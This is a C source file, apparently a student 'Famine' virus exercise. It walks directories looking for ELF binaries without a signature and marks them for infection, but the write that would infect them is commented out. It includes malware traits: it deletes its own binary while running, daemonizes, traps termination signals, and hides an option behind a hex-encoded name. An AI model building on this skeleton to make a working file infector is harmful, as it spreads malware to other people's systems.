/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
/*   Updated: 2024/08/01 12:45:22 by mgama            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#ifdef __APPLE__
#include "is_icloud.h"
#endif /* __APPLE__ */

struct s_famine g_famine;
int g_exit = 0;
size_t count = 0;

// const char magics[] = {
// 	{0x7f, 'E', 'L', 'F'}, // ELF
// 	{0xFF, 0xD8, 0xFF}, // JPEG
// 	{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}, // PNG
// 	{0x47, 0x49, 0x46, 0x38, 0x37, 0x61}, // GIF87
// 	{0x47, 0x49, 0x46, 0x38, 0x39, 0x61}, // GIF89
// };
const char elf_magic[] = {0x7f, 'E', 'L', 'F'};
const char signature[] = FM_SIGNATURE;
const size_t elf_magic_size = sizeof(elf_magic);

int get_terminal_width() {
    struct winsize w;
    ioctl(STDOUT_FILENO, TIOCGWINSZ, &w);
    return w.ws_col;
}

void cut_last_line(int text_length)
{
	int term_width = get_terminal_width() + 1;
	int line_count = text_length == term_width ? 1 : (text_length / term_width) + 1;
	for (int i = 0; i < line_count; i++) {
		ft_verbose("%s%s", UP, CUT);
	}
}

void remove_shm(void)
{
    shmctl(shmget(SHM_KEY, sizeof(int), 0666), IPC_RMID, NULL);
}

int is_running(void)
{
	/**
	 * Try to create a shared memory segment with the key SHM_KEY, if it fails
	 * this means that the program is already running.
	 */
	int shmid = shmget(SHM_KEY, sizeof(int), IPC_CREAT | IPC_EXCL | 0666);
	if (shmid == -1) {
		return 1;
	}
	return 0;
}

int	write_back_prog(void)
{
	ft_verbose("\n%sWriting back the program%s\n", B_GREEN, RESET);
	/**
	 * When the program is done, write it back to the filesystem
	 */
	int fd = open(g_famine.name, O_CREAT | O_WRONLY, 0755);
	if (fd < 0)
		return (0);
	write(fd, (char *)g_famine.me, g_famine.len);
	close(fd);
	munmap(g_famine.me, g_famine.len);
	return (0);
}

void interruptHandler(int sig)
{
	(void)sig;
	g_exit = 1;
}

void famine(char *target, char *parent)
{
	struct stat statbuf;
	char full_path[PATH_MAX + 1 + PATH_MAX];

	bzero(full_path, PATH_MAX + 1 + PATH_MAX);
	if (parent != NULL)
	{
		strcpy(full_path, parent);
		strcat(full_path, "/");
	}
	strcat(full_path, target);

	ft_verbose("%d: Checking %s%s%s\n", count, B_YELLOW, full_path, RESET);
	count++;

#ifdef __APPLE__
	if (is_icloud_file(full_path))
		return ;
#endif /* __APPLE__ */

	if (lstat(full_path, &statbuf) == -1)
		return ;

	/**
	 * Prevent from following file symlink
	 */
	if (S_ISLNK(statbuf.st_mode))
		return ;

	int fd = open(full_path, O_RDWR);
	if (fd == -1) {
		return ;
	}
	char buf[elf_magic_size];
	size_t n = read(fd, buf, elf_magic_size);
	// check if read has an error or if the number of byte if less than `elf_magic_size`
	if (n <= 0 || n < elf_magic_size)
	{
		close(fd);
		return ;
	}

	if (strncmp(buf, elf_magic, elf_magic_size) != 0)
	{
		close(fd);
		return ;
	}

	char sign_buf[sizeof(signature)];

	size_t pos = lseek(fd, 0, SEEK_END);
	lseek(fd, pos - sizeof(signature), SEEK_SET);
	// check if read has an error or if the number of byte if less than `sizeof(signature)`
	n = read(fd, sign_buf, sizeof(signature));
	if (n <= 0 || n < sizeof(signature))
	{
		close(fd);
		return ;
	}

	size_t i = 0;
	while (signature[i] == sign_buf[i] && i < sizeof(signature))
		i++;

	if (i == sizeof(signature))
	{
		close(fd);
		return ;
	}

	cut_last_line(verbose_size);
	ft_verbose("Infecting %s%s%s\n", B_PINK, full_path, RESET);
	ft_verbose("\n");
	// lseek(fd, pos, SEEK_SET);
	// write(fd, signature, sizeof(signature));
	close(fd);
}

void	custom_target(char *target, char *parent, int recursive, int recursive_depth)
{
	struct stat statbuf;
	DIR *dir;
	char full_path[PATH_MAX + 1 + PATH_MAX];

	bzero(full_path, PATH_MAX + 1 + PATH_MAX);

	/**
	 * Prevent from infinite loop
	 */
	if (g_exit || target == NULL || strcmp(target, ".") == 0 || strcmp(target, "..") == 0)
		return;

	if (recursive && recursive_depth == 0)
		return;

	if (recursive && recursive_depth > 0)
		recursive_depth--;

	if (parent != NULL)
	{
		strcpy(full_path, parent);
		strcat(full_path, "/");
	}
	strcat(full_path, target);

	if (lstat(full_path, &statbuf) == -1)
		return;
	/**
	 * Prevent from following dir symlink
	 */
	if (S_ISLNK(statbuf.st_mode))
		return ;
	if (S_ISREG(statbuf.st_mode))
	{
		famine(full_path, NULL);
		cut_last_line(verbose_size);
		return;
	}
	dir = opendir(full_path);
	if (!dir)
		return;
	for (struct dirent *d = readdir(dir); g_exit == 0 && d != NULL; d = readdir(dir))
	{
		if (recursive && d->d_type == DT_DIR) {
			custom_target(d->d_name, full_path, recursive, recursive_depth);
			continue;
		}
		famine(d->d_name, full_path);
		cut_last_line(verbose_size);
	}
	closedir(dir);
}

int main(int argc, char **argv)
{
	const char no_xsec[] = "\x69\x6B\x6E\x6F\x77\x77\x68\x61\x74\x69\x61\x6D\x64\x6F\x69\x6E\x67";
	struct stat stats;
	int ch, option = 0;
	char *target = NULL;
	int recursive_depth = -1;

	struct getopt_list_s optlist[] = {
        {"daemon", 'd', OPTPARSE_NONE},
        {"once", 'o', OPTPARSE_NONE},
        {"multi-instances", 'm', OPTPARSE_NONE},
        {"recursive", 'r', OPTPARSE_OPTIONAL},
        {no_xsec, 0, OPTPARSE_REQUIRED},
        {"verbose", 'v', OPTPARSE_NONE},
        {0}
    };
	struct getopt_s options;

    ft_getopt_init(&options, argv);
	while ((ch = ft_getopt(&options, optlist, NULL)) != -1) {
		switch (ch) {
			case 0:
				if (FM_SECURITY == 1)
					exit(0);
				option |= F_CUSTOM;
				target = options.optarg;
				break;
			case 'd':
				option |= F_DAEMON;
				break;
			case 'o':
				option |= F_ONCE;
				break;
			case 'm':
				option |= F_MINSTANCE;
				break;
			case 'r':
				option |= F_RECURSIVE;
				if (options.optarg != NULL)
				{
					recursive_depth = atoi(options.optarg);
					if (recursive_depth < 0) {
						ft_verbose("Invalid recursive depth\n");
						exit(0);
					}
					recursive_depth += 1; // +1 to skip first cycle
				}
				break;
			case 'v':
				verbose_mode = VERBOSE_ON;
				printf(B_PINK"Famine version %s%s%s by %s%s%s\n"RESET, CYAN, FM_VERSION, B_PINK, CYAN, FM_AUTHOR, RESET);
				break;
			default:
				exit(0);
		}
	}

	if (argc - options.optind != 0)
		return 0;

	ft_verbose("\n%s<== Verbose mode activated ==>%s\n\n", B_RED, RESET);

	if (0 == (option & F_MINSTANCE) && is_running())
	{
		ft_verbose("%sAnother instance is already running%s\n", B_RED, RESET);
		return (0);
	}

	int fd = open(argv[0], O_RDONLY);
	if (fd < 0)
		return 0;

	if (fstat(fd, &stats) < 0)
		return 0;

	g_famine.name = argv[0];
	g_famine.len = stats.st_size;
	/**
	 * Copy the binary into a shared memory segment to save it and remove it from the filesystem
	 * to remove it on runtime.
	 */
	g_famine.me = mmap(NULL, g_famine.len, PROT_READ, MAP_PRIVATE, fd, 0);
	close(fd);
	if (g_famine.me == NULL)
		return (write_back_prog());

	ft_verbose("%s%s%s dumped\n", B_GREEN, g_famine.name, RESET);

	if (unlink(argv[0]) < 0)
		return (write_back_prog());

	ft_verbose("%s%s%s removed\n", B_GREEN, g_famine.name, RESET);

	/**
	 * Daemonize the process if the option is set
	 */
	if (option & F_DAEMON)
	{
		ft_verbose("\n%sDaemonizing%s\n", B_CYAN, RESET);
		ft_verbose("Disabling verbose\n");
		verbose_mode = VERBOSE_OFF;
		/**
		 * BD_NO_CHDIR: Don't change the current working directory to the root directory
		 * BD_NO_REOPEN_STD_FDS: Don't reopen stdin, stdout, and stderr to /dev/null
		 */
		become_daemon(BD_NO_CHDIR | BD_NO_REOPEN_STD_FDS);
	}

	/**
	 * Register the function to be called at normal process termination
	 * Must be after daemonization to be effictive on the running process
	 */
	atexit(remove_shm);

	ft_verbose("Setting up signals handler\n");
	/**
	 * Catch kill signals to prevent segfaults.
	 */
	signal(SIGINT, interruptHandler);
	signal(SIGQUIT, interruptHandler);
	signal(SIGTERM, interruptHandler);
	signal(SIGSEGV, interruptHandler);

	/**
	 * Remove the `/` at the end of the target path if it exists
	 */
	if (target != NULL)
	{
		size_t len = strlen(target);
		if (len > 0 && target[len - 1] == '/')
			target[len - 1] = '\0';
	}

	ft_verbose("\nStarting infection...\n");

	do
	{
		count = 0;
		ft_verbose("New infection cycle\n");
		if (option & F_CUSTOM)
		{
			custom_target(target, NULL, option & F_RECURSIVE, recursive_depth);
		}
		else
		{
			custom_target(FM_TARGET, NULL, option & F_RECURSIVE, recursive_depth);
		}

		ft_verbose("\n%d files checked !\n", count);

		if (option & F_ONCE)
			break;

		sleep(30);
	} while(!g_exit);

	return (write_back_prog());
}
